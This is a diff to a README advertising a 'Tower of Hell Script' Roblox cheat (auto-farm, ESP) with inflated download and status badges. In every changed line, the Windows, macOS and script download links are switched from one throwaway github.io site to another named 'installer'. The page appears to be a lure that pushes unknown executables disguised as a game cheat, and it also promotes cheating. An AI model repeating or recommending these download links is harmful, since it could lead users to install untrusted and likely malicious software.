@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Tower of Hell Script](https://img.shields.io/badge/Download%20Tower%20of%20Hell%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download Tower of Hell Script](https://img.shields.io/badge/Download%20Tower%20of%20Hell%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Tower of Hell Script** for Tower of Hell — auto-farm, ESP,
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
